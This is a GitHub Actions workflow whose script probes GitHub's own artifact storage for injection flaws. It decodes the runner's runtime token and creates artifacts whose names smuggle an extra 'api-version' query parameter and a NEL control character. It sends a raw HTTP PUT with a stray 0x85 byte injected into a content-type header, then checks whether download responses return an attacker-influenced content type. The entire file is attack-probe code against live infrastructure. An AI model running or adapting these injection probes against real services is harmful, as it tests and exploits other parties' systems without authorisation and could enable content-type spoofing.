name: Probe raw legacy Blob MIME and artifact name suffixes
on:
  workflow_dispatch:
permissions:
  actions: read
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 4
    steps:
      - uses: actions/github-script@v8
        env:
          GH_TOKEN: ${{ github.token }}
        with:
          github-token: ${{ github.token }}
          script: |
            const tls = require('node:tls');
            const token = process.env.ACTIONS_RUNTIME_TOKEN;
            const results = process.env.ACTIONS_RESULTS_URL;
            const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
            const scope = claims.scp.split(' ').find(value => value.startsWith('Actions.Results:'));
            const [, run, job] = scope.split(':');
            const ids = {workflow_run_backend_id: run, workflow_job_run_backend_id: job};
            const base = `${new URL(results).origin}/twirp/github.actions.results.api.v1.ArtifactService/`;
            const body = Buffer.from('{"hello":"probe"}');
            async function twirp(method, payload) {
              const response = await fetch(base + method, {method:'POST', headers:{Authorization:`Bearer ${token}`, 'Content-Type':'application/json'}, body:JSON.stringify(payload)});
              return {status:response.status,data:await response.json().catch(()=>({}))};
            }
            async function rawPut(url) {
              const prefix = Buffer.from(`PUT ${url.pathname}${url.search} HTTP/1.1\r\nHost: ${url.host}\r\nConnection: close\r\nx-ms-version: 2025-01-05\r\nx-ms-blob-type: BlockBlob\r\nx-ms-blob-content-type: application/json`, 'ascii');
              const suffix = Buffer.from(`\r\nContent-Length: ${body.length}\r\n\r\n`, 'ascii');
              const request = Buffer.concat([prefix, Buffer.from([0x85]), suffix, body]);
              return await new Promise((resolve,reject)=>{
                const socket=tls.connect(443,url.hostname,{servername:url.hostname}); const chunks=[];
                socket.setTimeout(20000,()=>socket.destroy(new Error('timeout')));
                socket.once('secureConnect',()=>socket.write(request));
                socket.on('data',chunk=>chunks.push(chunk)); socket.once('error',reject);
                socket.once('end',()=>resolve(Buffer.concat(chunks).toString('latin1')));
              });
            }
            const cases = [
              ['base', `legacy-${process.env.GITHUB_RUN_ID}-base&api-version=2011-08-18`],
              ['nel-tail', `legacy-${process.env.GITHUB_RUN_ID}-tail&api-version=2011-08-18\u0085`],
              ['nel-before-amp', `legacy-${process.env.GITHUB_RUN_ID}-mid\u0085&api-version=2011-08-18`],
            ];
            for (const [label,name] of cases) {
              try {
                const created=await twirp('CreateArtifact',{...ids,name,version:7,mime_type:'application/json'});
                console.log(`${label} CREATE ${created.status} ok=${Boolean(created.data.ok)}`);
                if (!created.data.ok) continue;
                const uploadUrl=new URL(created.data.signed_upload_url||created.data.signedUploadUrl);
                const put=await rawPut(uploadUrl);
                console.log(`${label} PUT ${put.split('\r\n',1)[0]}`);
                if (!/^HTTP\/1\.1 201\b/.test(put)) continue;
                const fin=await twirp('FinalizeArtifact',{...ids,name,size:String(body.length)});
                const id=String(fin.data.artifact_id||fin.data.artifactId||'');
                console.log(`${label} FINALIZE ${fin.status} ok=${Boolean(fin.data.ok)} id=${/^\d+$/.test(id)?id:'none'}`);
                if(!fin.data.ok||!/^\d+$/.test(id)) continue;
                const api=`https://api.github.com/repos/${context.repo.owner}/${context.repo.repo}/actions/artifacts/${id}/zip`;
                const redirect=await fetch(api,{redirect:'manual',headers:{Authorization:`Bearer ${process.env.GH_TOKEN}`,Accept:'application/vnd.github.v3+json'}});
                const location=redirect.headers.get('location');
                if(!location){console.log(`${label} REST ${redirect.status} no_location`);continue;}
                const signed=new URL(location);
                console.log(`${label} REST ${redirect.status} rsct=${JSON.stringify(signed.searchParams.get('rsct'))} rscd=${JSON.stringify(signed.searchParams.get('rscd'))}`);
                for(const version of [null,'2009-09-19','2011-08-18','2013-08-15','2025-01-05']){
                  const target=new URL(location); if(version)target.searchParams.set('api-version',version);
                  const response=await fetch(target); const type=response.headers.get('content-type')||'';
                  console.log(`${label} GET ${version||'default'} status=${response.status} type=${JSON.stringify(type)} hex=${Buffer.from(type,'latin1').toString('hex')}`);
                }
              } catch(error) { console.log(`${label} ERROR ${String(error.message).slice(0,160)}`); }
            }
